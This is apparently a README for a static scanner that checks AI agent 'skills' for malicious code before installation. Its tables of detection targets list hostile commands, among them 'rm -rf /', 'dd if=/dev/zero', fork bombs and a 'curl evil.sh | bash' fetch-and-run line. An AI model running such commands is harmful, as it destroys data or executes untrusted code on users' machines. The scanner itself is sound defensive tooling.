# Skill Audit — Safety Scanner for Hermes Agent Skills

A static analysis tool that inspects Hermes Agent skills for malicious code, dangerous commands, and structural issues before installation.

> **Think `pip-audit` or `trivy`, but for AI agent skills.**

## Why

AI agents extend their capabilities through **skills** (SKILL.md + scripts). These skills have full system access — they can read/write files, run shell commands, install packages, and make network calls. Without inspection, a malicious skill could:

- `rm -rf /` or other destructive shell commands
- `curl evil.sh | bash` pipe-bomb execution
- Exfiltrate data via hidden network requests
- Import suspicious libraries (socket, paramiko, etc.)
- Write files outside safe paths

Skill Audit catches these before `skill_manage(action='create')`.

## Features

### 🔴 Block-level (must-fix)
| Check | What it catches |
|-------|----------------|
| `dangerous_command` | `rm -rf /`, `dd if=/dev/zero`, fork bombs |
| `python_syntax_error` | Broken scripts that won't run |
| `missing_skill_md` | Directory without SKILL.md |

### 🟡 Warning-level (review required)
| Check | What it catches |
|-------|----------------|
| `pipe_exec` | `curl \| bash` pipeline execution |
| `subprocess_call` | `os.system()`, `subprocess.run()` |
| `file_deletion` | `os.remove()`, `shutil.rmtree()` |
| `suspicious_import` | `socket`, `ctypes`, `paramiko`, `cryptography` |
| `unknown_import` | Non-whitelisted Python packages |
| `file_outside_safe_paths` | Writing outside `/tmp/`, `~/.hermes/` |
| `frontmatter_missing` | Missing YAML frontmatter fields |
| `skill_too_large` | >400 lines, needs splitting |

### 🟢 Informational
| Check | What it catches |
|-------|----------------|
| `skill_large` | >250 lines, consider splitting |
| `empty_dir` | Empty `references/` or `scripts/` directories |

## Quick Start

```bash
# Audit a single skill
python3 audit.py ~/.hermes/skills/research/a-share-stock-data/

# Audit all skills
bash bulk-audit.sh

# JSON output (for programmatic use)
python3 audit.py ~/.hermes/skills/research/arxiv/ --json
```

## Example Output

```
============================================================
  Skill Audit Report
  Target: ~/.hermes/skills/research/a-share-stock-data/
  Status: ✅ PASS
============================================================
  ℹ️ INFO (1 项)
  ========================================================
    [SKILL.md] skill 较大: 284 行 (>250)，可考虑拆分
  ────────────────────────────────────────────────────────
  总计: ❌ 0 拦截 | ⚠️ 0 警告 | ℹ️ 1 信息 | ✅ 通过
============================================================
```

## Batch Fix

The included `batch-fix-frontmatter.py` auto-adds missing `trigger` fields to all skills:

```bash
# Dry run
python3 batch-fix-frontmatter.py --dry-run

# Apply fixes
python3 batch-fix-frontmatter.py
```

## How It Works

1. **Dangerous command scanning** — regex patterns for destructive shell commands
2. **Pipe execution detection** — flags `curl|bash` patterns (skips markdown code blocks and safe pipe targets like `iconv`, `grep`, `jq`)
3. **Python AST analysis** — checks imports against a curated whitelist, detects `subprocess` calls, flags file writes outside safe paths
4. **Bash syntax check** — runs `bash -n` on shell scripts
5. **Frontmatter validation** — verifies `name`, `description`, `trigger` fields exist
6. **Reference integrity** — checks that referenced `references/`, `templates/`, `scripts/` directories exist

## Configuration

Edit the whitelists at the top of `audit.py`:

- `IMPORT_WHITELIST` — safe Python packages (stdlib + common libs)
- `SUSPICIOUS_IMPORTS` — packages that warrant review
- `SAFE_PIPE_TARGETS` — pipe destinations that are data-processing tools (not execution)
- `SAFE_FILE_PATHS` — safe write destinations
- `DANGEROUS_PATTERNS` — destructive command patterns

## Requirements

- Python 3.10+
- No external dependencies (stdlib only)

## Installation

```bash
# Clone the repo
git clone https://github.com/YOUR_USERNAME/skill-audit.git
cd skill-audit

# Or use directly with Hermes:
cp -r ~/.hermes/skills/devops/skill-audit/* /path/to/your/project/
```

## Limitations

- **Static analysis only** — logic-level backdoors ("if date is specific day, do X") cannot be detected
- **False positives** — legitimate scripts using `subprocess` or `socket` may be flagged
- **Markdown code blocks** — curl examples in documentation are skipped, but inline examples may trigger warnings

## License

[MIT](LICENSE)